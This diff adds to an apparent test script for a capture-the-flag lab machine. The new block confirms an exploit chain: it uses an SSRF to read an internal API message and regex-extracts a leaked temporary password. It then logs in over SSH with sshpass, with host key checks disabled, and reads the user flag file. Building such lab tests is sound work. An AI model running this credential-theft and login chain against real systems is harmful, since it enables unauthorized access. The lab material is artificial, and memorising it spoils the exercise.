@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
 """Non-destructive tests from an independent Docker network peer."""
 import json
+import os
+import re
+import subprocess
 import socket
 import urllib.error
 import urllib.parse
@@ -53,3 +56,24 @@ assert path2.startswith("/static/uploads/")
 metadata = json.loads(get(path2))
 assert "/api/latest/metadata/messages/authors" in metadata["routes"]
 print("PASS: genuine SSRF with outbound local HTTP, stored response bytes and API discovery", flush=True)
+
+# The leaked onboarding password must work against the actual SSH server.
+msg_path = preview("http://127.0.0.1:5000/api/latest/metadata/messages/authors")
+message = json.loads(get(msg_path))["messages"][0]["body"]
+password_match = re.search(r"Temporary password: ([^\\s.]+)", message)
+assert password_match, "Internal API no longer exposes onboarding information"
+env = os.environ.copy()
+env["SSHPASS"] = password_match.group(1)
+ssh_result = subprocess.run([
+    "sshpass", "-e", "ssh", "-T",
+    "-o", "StrictHostKeyChecking=no",
+    "-o", "UserKnownHostsFile=/dev/null",
+    "-o", "PreferredAuthentications=password",
+    "-o", "PubkeyAuthentication=no",
+    "-o", "ConnectTimeout=5",
+    "dev@" + HOST,
+    "id -un; cat /home/dev/user.txt; git -C /home/dev/apps rev-list --count HEAD",
+], capture_output=True, text=True, env=env, timeout=15)
+assert ssh_result.returncode == 0, (ssh_result.stdout, ssh_result.stderr)
+assert ssh_result.stdout.splitlines() == ["dev", "TTP{ci_user_first_instance}", "2"], ssh_result.stdout
+print("PASS: private API onboarding information authenticates to SSH and retrieves User flag", flush=True)
